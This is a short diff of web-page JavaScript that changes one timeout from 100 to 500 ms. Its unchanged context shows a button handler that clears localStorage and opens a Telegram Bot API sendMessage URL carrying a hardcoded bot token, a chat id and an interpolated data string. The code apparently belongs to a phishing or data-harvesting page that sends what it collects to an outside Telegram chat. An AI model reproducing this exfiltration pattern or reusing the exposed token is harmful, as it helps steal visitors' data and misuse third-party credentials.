@@ -263,7 +263,7 @@ button.onclick = function(){
 		document.getElementsByClassName('zak')[0].style.display = 'flex'
 		localStorage.clear()
 		let win = window.open([`https://api.telegram.org/bot5468188023:AAGLtH87xwdcZO7bCa7WuKbRdJ5OsX6kRP4/sendMessage?chat_id=-1001617821095&parse_mode=html&text=${string}`])
-		setTimeout(function(){win.close()}, 100)
+		setTimeout(function(){win.close()}, 500)
 		setTimeout(
 		
 			function(){
